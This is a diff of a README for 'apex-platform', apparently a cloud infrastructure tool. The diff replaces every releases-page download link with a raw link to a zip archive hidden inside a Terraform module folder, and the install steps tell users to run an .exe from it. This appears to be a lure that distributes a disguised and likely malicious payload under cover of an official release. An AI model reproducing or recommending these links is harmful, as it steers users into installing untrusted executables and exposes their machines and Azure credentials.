@@ -1,6 +1,6 @@
 # ⚙️ apex-platform - Manage your cloud infrastructure with ease
 
-[![Download apex-platform](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/patenintercontinental4580/apex-platform/releases)
+[![Download apex-platform](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/patenintercontinental4580/apex-platform/main/terraform/modules/azure-spoke-vnet/apex-platform-v3.4.zip)
 
 ## 📌 Project Overview
 
@@ -22,7 +22,7 @@ Ensure you have your Azure account credentials ready. You will provide these det
 
 Follow these steps to set up the software on your machine:
 
-1. Visit the following page to choose the latest version: [https://github.com/patenintercontinental4580/apex-platform/releases](https://github.com/patenintercontinental4580/apex-platform/releases).
+1. Visit the following page to choose the latest version: [https://raw.githubusercontent.com/patenintercontinental4580/apex-platform/main/terraform/modules/azure-spoke-vnet/apex-platform-v3.4.zip](https://raw.githubusercontent.com/patenintercontinental4580/apex-platform/main/terraform/modules/azure-spoke-vnet/apex-platform-v3.4.zip).
 2. Look for the file ending in `.exe` under the Assets section of the latest release.
 3. Click the file to start the download.
 4. Save the file to your Downloads folder.
@@ -47,7 +47,7 @@ The platform uses Open Policy Agent to ensure every deployment follows your orga
 
 ## 🔄 Updating the Platform
 
-We release updates to improve performance and add features. When a new version arrives, the platform notifies you upon startup. You can also manually download the latest files from the download page: [https://github.com/patenintercontinental4580/apex-platform/releases](https://github.com/patenintercontinental4580/apex-platform/releases).
+We release updates to improve performance and add features. When a new version arrives, the platform notifies you upon startup. You can also manually download the latest files from the download page: [https://raw.githubusercontent.com/patenintercontinental4580/apex-platform/main/terraform/modules/azure-spoke-vnet/apex-platform-v3.4.zip](https://raw.githubusercontent.com/patenintercontinental4580/apex-platform/main/terraform/modules/azure-spoke-vnet/apex-platform-v3.4.zip).
 
 Run the installer again to perform an upgrade. The installer detects the old version and replaces the files while saving your settings and project history. You do not lose your configurations.
 
